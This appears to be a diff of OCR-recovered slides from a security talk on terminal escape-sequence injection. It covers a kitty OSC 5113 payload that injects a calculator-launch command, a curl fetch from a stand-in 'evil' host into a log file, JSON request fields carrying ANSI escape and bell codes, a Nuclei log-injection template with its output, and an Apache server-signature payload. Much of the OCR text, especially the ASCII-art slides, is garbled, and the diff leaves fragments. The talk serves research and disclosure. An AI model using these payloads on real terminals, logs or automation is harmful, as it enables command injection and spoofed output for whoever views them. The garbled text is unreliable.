-& G O & hitps://sw.kovidgoyal.net/kitty/file-transfer-protocol/
 00 File transfer over the TTY
 >_ There are sometimes situations where the TTY is the only convenient pipe between two
 connected systems, for example, nested SSH sessions, a serial line, etc. In such scenarios, it is
@@ -2051,18 +1905,17 @@ useful to be able to transfer files over the TTY.
 
 **OSC5113 - KITTY FILETRANSFER OVER TTY**
 
-```
+\```
 printf '\033]5113;ac=send;id=\nopen -a calculator.app\n\033\\'
-```
+\```
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 94/100 on the text kept, 90/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 OSCS5113 - KITTY
 FILETRANSFER OVER TTY
 \nopen -a calculator.app\n
-oP
-& G O & hitps://sw.kovidgoyal.net/kitty/file-transfer-protocol/
 00 File transfer over the TTY
 >_ There are sometimes situations where the TTY is the only convenient pipe between two
 connected systems, for example, nested SSH sessions, a serial line, etc. In such scenarios, it is
@@ -2073,18 +1926,12 @@ useful to be able to transfer files over the TTY.
 
 **OSC5113 - KITTY FILETRANSFER OVER TTY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-eee ~/Documents
-> Documents printf '\@33]5113;ac=send;id=\nopen -a calculator. app\n\033\\'|
-```
-
 ## Slide 125
 
 **OSC5113 - KITTY FILETRANSFER OVER TTY**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 83/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 eee ~/Documents
@@ -2113,56 +1960,27 @@ zsh: command not found: 5113
 
 **TERMINALINJECTION.COM**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 74/100 on the text kept, 42/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 TERMINALINJECTION.COM
-6 * LAY Le2m*cl*) L3a2m Je
-7 “|]1337;ClearScrollback#
-8 *)[33m4
-9 cllcccccc:::::::ccll:, LOKKKKKKKKKKKKKKKKXKKKKKKKXKKKKKXKKKKKKKKKKKKKKKKK@C,CC:;:
-1@ cccce::::::2cLLLLL lec LONMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMKc: Looe
-11 :cecc::cecllleccl: : xNMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMO>s 5c: :
-12 LULL lL lecccccccc, oNMMMWKOOKNWNWWWN@KNMMMMMWNNXKNMMMMWXKXNMWWWWWNKNMMMMMMMXc ' ss 5
-13 LLLLiblLece:::::¢:;kKMMMMWKL LkdooxOKxcdXMMMMMXxxockNMMM@ LoO@@0dxkx LcxXNMMMMMMXc ':::
 14 lecccelececceccc: , dWMMMMWOOKo Ladx@@0 L@MMMMMKdkO LdKMMMO LKNOxxoo00CcCd@XXWMMMMK: ,c: :
-15 Ullciigiaya es ay 3 OWMMMMWWWNNNNXNWXXWMMMMMWXNXKNWMMMNXWMNXNNWWXOOXNXWMMMNG', 333
-16 LlLlooolce:::::cccl: :dKWMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMNX 2 ts
-17 ooooddddddxxdddolccc: : 0OXWMMMMMMMMMMMMMMMMMMMMMMMMMM MM MMMMMMMMMMMMMMWXK Lcdd Lecce
-18 OLLI Lccccce: Cot: CoC ECOdXKOIKXXANNNWWHNW Wet ERE ES PERS ERRRR IRN MNXGO x0 LC; :0d000 LC
-19 Okxdddddddxkd::clle:::1llce:;,,;coddddddddddol@MWkkkkkkkkkxdddddolcc::cloc,.';:333
-20 KXXXNXXNNNXKcoxkkkkxdc Lxkk kOOOKXXXXXXXKKKKkcKMXo0OkKKkOOOOxoolccccc::;3;::¢ldxLldd
-21 KXXXXXXXNNK Lexkkkkxdo Ll: cdddx@XXXXXNNXXXXXXk LOMKOXXXXXXXKKXXKBkkxddoodk@KKKKdc LxK
-22 KKkd@XXXNNKOLxdL:,'..««}OXXOOQXXNNNNXXXXXXd LXWkOB@XXXXXXKKKKKXXXXXXKXXXXXKKKLxkoo
 23 @x:cOXXXXKOL;,. » ;OKKKKOCKNNNNNNNNXXXKOGN@dOXXXXXXXXXXXXXXXXXXXXXXKKK kox@@Od
-24 ddlo@X@xooodool: ; ; ; cAKKKKXOCCAKKNNNNNNNNN@ ok @dOXXXXXXXXXXXXKOXXXXXXXXXKOdOKOOVOX
-25 x00l@0d1; LkkdddxxkkxxdolLl Ldxd l LA@NNNNNNNKoddOXXXXXXXXXXXXKd Cc OXXXXXXXOdox00@OxxK
-26 @@ookdxdllodl: LoL LLLLLlodxkkkkkx LCKXXNN@x L LKKXXXXXXXXXXXXKxXOOdKXXXXOdox0000KOkdx
 27
 28
 29
 30
-k@x LLd@xxOkd: LkkkkkxxxxkkkkkkxdxOxxxkkK@kkOXNXXXXXXXXXXXKxXdOkOOXKOddx0@00d@OkkOx y
 x00ocdkkxkx; ; dkkkdoodddddodkxd@N@o;, , , LONNNNNXXXXXXXXXXKkxOKOokOddk@K@kxdx@k0@00
-kO@0Okkko,. .LkKxdx@NNKOOOkdLdKWO,...... OKXXXNXXNXXOOOKKOOO0@D Lcok@KKOKxkxxO0@KKK
-@00000k:.. .«CkdkNMXo'..'ckddXXc....... LOKNXXXOx1; ''" '; 00O0xk@doOKKOKkKO0@@xkO00KOO
-31 @0000d,... ;0d@MNo. ....,O0@NL..... -USCGMBoc sooccoo8 :OkKx@OKKOKkO@KOO00KO0B00
-32 OK@OL..... POOUMN Uetetatetstet= hii aes cat ea onesenes ; OOxKKKKxOKKKKKKK@KOK@00
-33 @K@L. .... »OOdXWO; sae: "codxdlcccoxkkkx, a »XKKOxKKx@XKKKKKKKK000000
-Se OL! pone . LxookKO1; '.. 'cxkkxdoodkkkkkkd, . » OKKKK@xdOKKKKKKKKKQ0@0k80
-535) [WiNlgoeooor “okkdooddolcldxkkkkkkkkkkkkkkkl' . . ':CLKKKKKKOQ@KKKKXXKKK@0000000
-B48 (Whe gener »Xkkkkkkxxxxdoccdkxkkxkkkkkkkkkxo Lc Lodx Ll LKKKKKKKKKKKXXXKKKKK@000000
-37 @Kx'. .. » UKKXxKXXKXOC: ldoc:c lLodxxkkkkkkkkxxdo ll LOOKKKKKKKKKKXKKKKKKKKKK@KK@@
-AA All. _ a i rs ee ee 999999 . 2.3444 Jl AMWIUILLAAUVUYYYY Uva aA
 ```
 
 ## Slide 129
 
 ###### **TERMINALINJECTION.COM**
 
-```
+\```
 curl -L evil.terminalinjection.com > badlog.log
-```
+\```
 
 ## Slide 130
 
@@ -2174,41 +1992,41 @@ curl -L evil.terminalinjection.com > badlog.log
 
 ## Slide 132
 
-```
+\```
 POST /api/somepath HTTP/1.1
 Host: 127.0.0.1:8080
 Content-Length: x
 Content-Type: application/json
 Connection: close
-```
+\```
 
-```
+\```
 {
 "somekey":"somevalue"
 }
-```
+\```
 
 ## Slide 133
 
-```
+\```
 POST /api/somepath HTTP/1.1
 Host: 127.0.0.1:8080
 Content-Length: x
 Content-Type: application/json
 Connection: close
-```
+\```
 
-```
+\```
 {
 "somekey":"somevalue\n\u001b[31mESC-INJECTION-LFUNICODE:\u001b[32mSUCCESSFUL\u001b[0m\u0007\n"
 }
-```
+\```
 
 ###### **APPEND UNICODE**
 
 ## Slide 134
 
-```
+\```
 HTTP/1.1 500 Internal Server Error
 content-type: application/json; charset=utf-8
 content-length: x
@@ -2220,7 +2038,7 @@ Connection: close
 "message":"query does not support somevalue\n\u001b[31mESC-INJECTION-LFUNICODE:
 \u001b[32mSUCCESSFUL\u001b[0m\u0007\n"
 }
-```
+\```
 
 ###### **PLAUSIBLE (MOST LIKELY)**
 
@@ -2230,31 +2048,31 @@ Connection: close
 
 ## Slide 136
 
-```
+\```
 POST /api/somepath HTTP/1.1
 Host: 127.0.0.1:8080
 Content-Length: x
 Content-Type: application/json
 Connection: close
-```
+\```
 
 `{ "somekey":"somevalue[32mESC-INJECTION-RAW:[31mSUCCESSFUL[0m" }` **APPEND ESC/BELL (0X1B/0X07)**
 
 ## Slide 137
 
-```
+\```
 POST /api/somepath HTTP/1.1
 Host: 127.0.0.1:8080
 Content-Length: x
 Content-Type: application/json
 Connection: close
-```
+\```
 
-```
+\```
 {
 "somekey":"somevalue[32mESC-INJECTION-RAW:[31mSUCCESSFUL[0m"
 }
-```
+\```
 
 ## Slide 138
 
@@ -2266,7 +2084,7 @@ Connection: close
 
 ## Slide 140
 
-```
+\```
 HTTP/1.1 500 Internal Server Error
 content-type: application/json; charset=utf-8
 content-length: x
@@ -2276,7 +2094,7 @@ Connection: close
 "statusCode":500,
 "error":"Internal Server Error",
 }
-```
+\```
 
 ###### **STRIPPED ERROR MESSAGE**
 
@@ -2298,7 +2116,8 @@ Connection: close
 
 **https://nuclei.projectdiscovery.io/**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 82/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 id: Terminal—injection—poc
@@ -2313,14 +2132,12 @@ tags: loginjection
 http:
 — method: GET
 path:
-- '{{BaseURL}}/%@a%1B%5B3 1mESC-—INJECTION-LFURLENCODED : %1B%5B32mSUCCESSFUL%1B%5BQ@m%07%@a '
 - '{{BaseURL}}/\u001b [31mESC—INJECTION—UNICODE: \u@01b [32mSUCCESSFUL\u0@1b [@m\U0007 '
 matchers-—condition: or
 matchers:
 - type: word
 part: body
 words:
-— ':\u001b[32mSUCCESSFUL\uQ01b [0m\u0007 '
 1
 2
 3
@@ -2329,8 +2146,6 @@ words:
 6
 7
 8
-)
-Q
 1
 2
 3
@@ -2345,7 +2160,8 @@ Q
 
 **RENDERED IN NUCLEI WHEN TESTING**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 90/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 [INF] New templates added in Latest release: 33
@@ -2354,7 +2170,6 @@ Q
 [INF] Running httpx on input host
 [INF] Found 1 URL from httpx
 [INT] [Terminal injection poc] Dumped HTTP request for http://127.0.0.1/1345/%OAESC INJECTION LIURLENCODED: SUCCESSIUL%O7%DA
-GET /1345/%0a%1B45B31mESC-INJECTION-LFURLENCODED: S1B%5B32mSUCCESSFULS1LBXSBOmM%O7%Oa HTTP/1.1
 Host: 127,.0.0.1
 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_3) AppleWebKit/537.36 (KHTML, Like Gecko) Chrome/51,.0.2866.71 Safari,
 37.36
@@ -2362,7 +2177,6 @@ Connection: close
 Accept: */x*
 Accept Language: en
 Accept-Encoding: gzip
-[DBG| |[Terminal-injection-poc] Dumped HTTP response http: //127.0.0,.1/1345/%0AESC-INJECTION-LFURLENCODED: SUCCESSFUL%0 720A
 HTTP/1.1 104 Not Found
 Connection: close
 Content-Length: 555
@@ -2375,41 +2189,12 @@ Server: nginx/1.23.3
 
 **DONT GO +ACCESS BRRRRRR TO LOGS RRRRRRR https://nuclei.projectdiscovery.io/**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
-
-```text
-id: Terminal—injection-poc
-Examp pres ation at Bla nd DEF
-ec
-i
-part: body
-words:
-— ':\u@01b[32mSUCCESSFUL\uQ01b [0m\ud007 '
-1
-2
-3
-4
-5
-6
-7
-8
-9
-@
-1
-2
-3
-4
-5
-6
-7
-3
-```
-
 ## Slide 147
 
 **+ACCESS TO LOGS**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 85/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 172.17.0.1 - - [01/Aug/2023:07:21:07 +0000] "HEAD /1345 HTTP/1.1" 404 © "-" "Mozilla/5.0 (Windows NT 5.1
@@ -2448,7 +2233,8 @@ ebKit/537.36 (KHTML, Like Gecko) Chrome/70.0.3538.77 Safari/537.36" "-"
 
 **WHERE ELSE DOES THIS RENDER? TIME TO BREAK SOME AUTOMATION!**
 
-> Text below was recovered by OCR from an image-only slide; treat wording as approximate.
+
+> Recovered by OCR — confidence 89/100 on the text kept, 88/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
 
 ```text
 GNU nano 6.4 /etc/apache2/conf-enabled/security.conf *
@@ -2462,7 +2248,6 @@ GNU nano 6.4 /etc/apache2/conf-enabled/security.conf *
 #ServerTokens Minimal
 #ServerTokens 0s
 ServerTokens Full
-SecServerSignature '4||31mESC-INJECTION:“||32mSUCCESSFUL*| |©m'
 #
 # Optionally add a line containing the server version and virtual host
 # name to server-generated pages (internal error documents, FTP directory
